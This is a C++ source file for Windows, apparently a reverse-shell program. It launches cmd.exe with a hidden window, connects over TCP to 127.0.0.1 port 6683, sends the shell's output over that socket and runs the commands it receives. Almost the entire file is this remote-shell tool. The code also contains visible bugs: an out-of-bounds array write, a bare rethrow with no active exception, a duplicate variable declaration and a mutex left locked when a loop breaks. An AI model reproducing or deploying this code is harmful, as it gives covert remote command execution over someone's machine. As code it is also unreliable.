//#define WIN32_LEAN_AND_MEAN

#include "pch.h"
#include <stdlib.h>
#include <winsock2.h>
#include <winbase.h>
#include <string>
#include <iostream>
#include <mutex>
#include <queue>

#include <ws2tcpip.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define BUFFER_SIZE 200
#define SHELL_PROCESS "C:\\Windows\\System32\\cmd.exe"

// These fields are filled in at session creation time
HANDLE  ReadPipeHandle;         // Handle to shell stdout pipe
HANDLE  WritePipeHandle;        // Handle to shell stdin pipe
HANDLE  ProcessHandle;          // Handle to shell process
std::queue<std::string> writeQ;
std::queue<std::string> readQ;

std::mutex m;

//
// Private prototypes
//

HANDLE StartShell (HANDLE StdinPipeHandle, HANDLE StdoutPipeHandle);

VOID SessionReadShellThreadFn (LPVOID Parameter);

VOID SessionWriteShellThreadFn (LPVOID Parameter);

VOID SessionSocketShellThreadFn (LPVOID Parameter);



// **********************************************************************
//
// CreateSession
//
// Creates a new  Involves creating the shell process and establishing
// pipes for communication with it.
//
// Returns a handle to the session or NULL on failure.
//
int CreateSession() {
	BOOL result;
	SECURITY_ATTRIBUTES SecurityAttributes;
	HANDLE ShellStdinPipe = NULL;
	HANDLE ShellStdoutPipe = NULL;

	try {
		// Reset fields in preparation for failure
		ReadPipeHandle = NULL;
		WritePipeHandle = NULL;

		// Create the I/O pipes for the shell
		SecurityAttributes.nLength = sizeof(SecurityAttributes);
		SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
		SecurityAttributes.bInheritHandle = TRUE; // Shell will inherit handles

		result = CreatePipe(&ReadPipeHandle, &ShellStdoutPipe, &SecurityAttributes, 0);
		if (!result)
			throw;

		result = CreatePipe(&ShellStdinPipe, &WritePipeHandle, &SecurityAttributes, 0);
		if (!result)
			throw;

		// Start the shell
		ProcessHandle = StartShell(ShellStdinPipe, ShellStdoutPipe);

		// Close handle to stdin/out Pipe of shell
		CloseHandle(ShellStdinPipe);
		CloseHandle(ShellStdoutPipe);

		// Check result of shell start
		if (ProcessHandle == NULL)
			throw;


		// Success all, return the session pointer as a handle
		return 0;

	}
	catch (int e) {

		//close and clean if while loop break
		if (ShellStdinPipe != NULL)
			CloseHandle(ShellStdinPipe);
		if (ShellStdoutPipe != NULL)
			CloseHandle(ShellStdoutPipe);
		if (ReadPipeHandle != NULL)
			CloseHandle(ReadPipeHandle);
		if (WritePipeHandle != NULL)
			CloseHandle(WritePipeHandle);

		//free(Session);

		return -1;
	}
	
}



int RemoteShell() {

	if (CreateSession() != 0)
		return -1;

	HANDLE  ReadShellThreadHandle;  // Handle to session shell-read thread
	HANDLE  WriteShellThreadHandle; // Handle to session shell-write thread
	HANDLE  SocketShellThreadHandle; // Handle to session shell-write thread

	SECURITY_ATTRIBUTES SecurityAttributes;
	DWORD ThreadId;
	HANDLE HandleArray[3];
	int i;

	SecurityAttributes.nLength = sizeof(SecurityAttributes);
	SecurityAttributes.lpSecurityDescriptor = NULL; // Use default ACL
	SecurityAttributes.bInheritHandle = FALSE; // No inheritance

	// Create the session threads
	//
	ReadShellThreadHandle =
		CreateThread(&SecurityAttributes, 0,
		(LPTHREAD_START_ROUTINE)SessionReadShellThreadFn,
			NULL, 0, &ThreadId);

	if (ReadShellThreadHandle == NULL) {

		//
		// Reset the client pipe handle to indicate this session is disconnected
		//
		//Session->ClientSocket = INVALID_SOCKET;
		return(FALSE);
	}

	WriteShellThreadHandle =
		CreateThread(&SecurityAttributes, 0,
		(LPTHREAD_START_ROUTINE)SessionWriteShellThreadFn,
			NULL, 0, &ThreadId);

	if (WriteShellThreadHandle == NULL) {
		//
		// Reset the client pipe handle to indicate this session is disconnected
		//
		//Session->ClientSocket = INVALID_SOCKET;

		TerminateThread(WriteShellThreadHandle, 0);
		return(FALSE);
	}

	SocketShellThreadHandle =
		CreateThread(&SecurityAttributes, 0,
		(LPTHREAD_START_ROUTINE)SessionSocketShellThreadFn,
			NULL, 0, &ThreadId);

	if (SocketShellThreadHandle == NULL) {

		//
		// Reset the client pipe handle to indicate this session is disconnected
		//
		//Session->ClientSocket = INVALID_SOCKET;
		return(FALSE);
	}

	//
	// Wait for either thread or the shell process to finish
	//
	
	HandleArray[0] = ReadShellThreadHandle;
	HandleArray[1] = WriteShellThreadHandle;
	HandleArray[2] = ProcessHandle;
	HandleArray[3] = SocketShellThreadHandle;

	i = WaitForMultipleObjects(4, HandleArray, FALSE, 0xffffffff);


	switch (i) {
	case WAIT_OBJECT_0 + 0:
		TerminateThread(WriteShellThreadHandle, 0);
		TerminateProcess(ProcessHandle, 1);
		TerminateThread(SocketShellThreadHandle, 0);
		break;

	case WAIT_OBJECT_0 + 1:
		TerminateThread(ReadShellThreadHandle, 0);
		TerminateProcess(ProcessHandle, 1);
		TerminateThread(SocketShellThreadHandle, 0);
		break;
	case WAIT_OBJECT_0 + 2:
		TerminateThread(WriteShellThreadHandle, 0);
		TerminateThread(ReadShellThreadHandle, 0);
		TerminateThread(SocketShellThreadHandle, 0);
		break;
	case WAIT_OBJECT_0 + 3:
		TerminateThread(WriteShellThreadHandle, 0);
		TerminateThread(ReadShellThreadHandle, 0);
		TerminateProcess(ProcessHandle, 1);
		break;

	default:
		break;
	}


	// Close handles to the shell process, and the shell pipes
	//shutdown(Session->ClientSocket, SD_BOTH);
	//closesocket(Session->ClientSocket);
	//TerminateProcess(Session->ProcessHandle, 1);

	DisconnectNamedPipe(ReadPipeHandle);
	CloseHandle(ReadPipeHandle);

	DisconnectNamedPipe(WritePipeHandle);
	CloseHandle(WritePipeHandle);

	CloseHandle(ProcessHandle);

	//free(Session);

	return 0;
}


// **********************************************************************
// StartShell
//
// Execs the shell with the specified handle as stdin, stdout/err
//
// Returns process handle or NULL on failure
//
HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle) {
	PROCESS_INFORMATION ProcessInformation;
	STARTUPINFO si;
	HANDLE ProcessHandle = NULL;

	// Initialize process startup info
	si.cb = sizeof(STARTUPINFO);
	si.lpReserved = NULL;
	si.lpTitle = NULL;
	si.lpDesktop = NULL;
	si.dwX = si.dwY = si.dwXSize = si.dwYSize = 0L;
	si.wShowWindow = SW_HIDE;
	si.lpReserved2 = NULL;
	si.cbReserved2 = 0;

	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

	si.hStdInput = ShellStdinPipeHandle;
	si.hStdOutput = ShellStdoutPipeHandle;

	DuplicateHandle(GetCurrentProcess(), ShellStdoutPipeHandle, GetCurrentProcess(), &si.hStdError, DUPLICATE_SAME_ACCESS, TRUE, 0);

	if (CreateProcess(NULL, (LPSTR)SHELL_PROCESS, NULL, NULL, TRUE, 0, NULL, NULL, &si, &ProcessInformation)) {
		ProcessHandle = ProcessInformation.hProcess;
		CloseHandle(ProcessInformation.hThread);
	}
	else {
		//fail
	}


	return ProcessHandle;
}


// **********************************************************************
// SessionReadShellThreadFn
//
// The read thread procedure. Reads from the pipe connected to the shell
// process, writes to the socket.
//
VOID SessionReadShellThreadFn (LPVOID Parameter) {
	//HANDLE ReadPipeHandle = (HANDLE)Parameter;
	LPTSTR buf;
	DWORD bytesAvailable = 0,
	bytesRead = 0;
	std::size_t found;
	//std::string str;

	// this bogus peek is here because win32 won't let me close the pipe if it is
	// in waiting for input on a read.
	while (TRUE)
	{
		
		PeekNamedPipe(ReadPipeHandle, NULL, 0, NULL, &bytesAvailable, NULL);
		// Check xem pipe co duoc gui them du lieu vao hay khong
		//printf(".");
		if (bytesAvailable > 0) {
			buf = (LPTSTR)malloc(bytesAvailable+1);
			memset(buf, 0, bytesAvailable+1);
			ReadFile(ReadPipeHandle, buf, bytesAvailable, &bytesRead, NULL);
			//found = str.find_first_of("\r\n ");
			//str = str.substr(found+3);
			printf("%s", buf);
			m.lock();
			readQ.push(std::string(buf));
			m.unlock();
			free(buf);
		}
		Sleep(50);
	}
	ExitThread(0);
}


// **********************************************************************
// SessionWriteShellThreadFn
//
// The write thread procedure. Reads from socket, writes to pipe connected
// to shell process.  
VOID SessionWriteShellThreadFn (LPVOID Parameter) {
	DWORD   BytesWritten;
	std::string tmp;

	while (TRUE) {
		m.lock();
		if (writeQ.size() > 0) {
			tmp = writeQ.front();
			writeQ.pop();
			if (!WriteFile(WritePipeHandle, tmp.c_str(), tmp.size(), &BytesWritten, NULL))
				break;
		}
		m.unlock();
	}

	ExitThread(0);
}

VOID SessionSocketShellThreadFn (LPVOID Parameter) {
	 std::string tmp;


	 WSADATA wsaData;
	 SOCKET ConnectSocket = INVALID_SOCKET;
	 struct addrinfo *result = NULL,
		 *ptr = NULL,
		 hints;
	 const char *sendbuf = "this is a test";
	 char recvbuf[512];
	 int iResult;
	 int recvbuflen = 512;

	 // Initialize Winsock
	 iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	 if (iResult != 0) {
		 ExitThread(0);
	 }

	 ZeroMemory(&hints, sizeof(hints));
	 hints.ai_family = AF_UNSPEC;
	 hints.ai_socktype = SOCK_STREAM;
	 hints.ai_protocol = IPPROTO_TCP;

	 // Resolve the server address and port
	 iResult = getaddrinfo("127.0.0.1", "6683", &hints, &result);
	 if (iResult != 0) {
		 WSACleanup();
		 ExitThread(0);
	 }

	 // Attempt to connect to an address until one succeeds
	 for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		 // Create a SOCKET for connecting to server
		 ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
			 ptr->ai_protocol);
		 if (ConnectSocket == INVALID_SOCKET) {
			 printf("socket failed with error: %ld\n", WSAGetLastError());
			 WSACleanup();
			 ExitThread(0);
		 }

		 // Connect to server.
		 iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		 if (iResult == SOCKET_ERROR) {
			 closesocket(ConnectSocket);
			 ConnectSocket = INVALID_SOCKET;
			 continue;
		 }
		 break;
	 }

	 freeaddrinfo(result);

	 if (ConnectSocket == INVALID_SOCKET) {
		 printf("Unable to connect to server!\n");
		 WSACleanup();
		 ExitThread(0);
	 }

	 std::string tmp;

	 while (TRUE) {

		 m.lock();
		 if (readQ.size() > 0) {
			 tmp = readQ.front();
			 readQ.pop();
			 iResult = send(ConnectSocket, tmp.c_str(), tmp.size(), 0);
			 tmp.clear();
		 }
		 m.unlock();
		 //iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
		 if (iResult == SOCKET_ERROR) {
			 printf("send failed with error: %d\n", WSAGetLastError());
			 break;
		 }

		 Sleep(50);

		 iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		 if (iResult > 0) {
			 tmp = std::string(recvbuf);
			 m.lock();
			 writeQ.push(tmp);
			 m.unlock();
			 tmp.clear();
		 }
			 
		 else if (iResult < 0) {
			 printf("recv failed with error: %d\n", WSAGetLastError());
			 break;
		 }
			 


		 //m.lock();
		 //tmp = new TCHAR[100];
		 /*std::getline(std::cin, tmp);
		 if (tmp == "exit")
			break;
		 tmp += "\r\n";
		 m.lock();
		 writeQ.push(tmp);
		 m.unlock();*/
	 }

	 // cleanup
	 closesocket(ConnectSocket);
	 WSACleanup();
	 ExitThread(0);
 }

int main() {
	RemoteShell();
	return 0;
}